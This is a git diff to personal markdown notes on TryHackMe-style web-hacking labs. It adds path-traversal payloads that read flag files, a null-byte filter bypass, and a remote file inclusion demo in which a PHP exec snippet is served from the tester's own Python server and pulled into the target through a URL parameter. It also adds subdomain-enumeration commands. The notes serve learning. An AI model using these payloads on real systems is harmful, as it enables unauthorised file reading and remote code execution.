@@ -499,18 +499,46 @@ As a developer, it's important to be aware of web application vulnerabilities, h
 
 ### CHALLENGE 
 
-**Flag1**
+**Flag1**  
 GET Method is not working I created a script that uses post method with a parameter 
 ![flag](./media/5-challenge1.png)
 
 
-**Flag2**
+**Flag2**  
 Changed the cookie value to `THM=../../../../etc/flag2`
 then refreshed 
 ![flag](./media/5-challenge2.png)
 
 
-## My TakeAways
+**Flag3**  
+Change the method from `GET` to `POST` 
+GET parameter was being filtered
+POST data using parameter escaped the filter together with `NULL BYTE`
+
+`../../../../etc/flag3%00`
+![flag](./media/5-challenge3.png)
+
+RCE LAB # PLAYGROUND
+
+created a file cmd.txt 
+```
+<?php 
+    print exec('hostname')
+?>
+```
+
+Then serve it as python server 
+![http](./media/5-http.png)
+
+
+Then access it in the url like this   
+`http://10.10.70.133/playground.php?file=http://10.10.210.23:8080/cmd.txt`
+![http](./media/5-rce.png)
+
+
+---
+
+## MY TAKEAWAYS
 
 **WALKING APPLICATION**
 - Look at comments
@@ -533,6 +561,15 @@ Content can be many things, a file, video, picture, backup, a website feature.
 
 
 **SUBDOMAIN ENUMERATION**
+- sublist3r.py -d $url # OSINT Subdomain discovery 
+- check at `https://crt.sh` good for history tracking also 
+- dnsrecon -t brt -d $url #   Bruteforce with list
+
+For private subdomains, (using vhost,dns revolve in development)
+
+`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u $url`
+> FUZZ will be replaced by wordlist
+> Will use header host for redirection 
 
 
 **IDORS**
@@ -548,5 +585,17 @@ Study
 Null Bytes
 ENCODING 
 
+Study how the server receives the requests. 
+what function are they using. 
+do they store it in a variable. 
+can it be overridden? 
+can you pollute it? 
 
- 
+In this example in PHP  `$_REQUEST`, `function.inclue` and `file_get_contents` 
+are the functions that got exploited. 
+
+
+
+
+
+
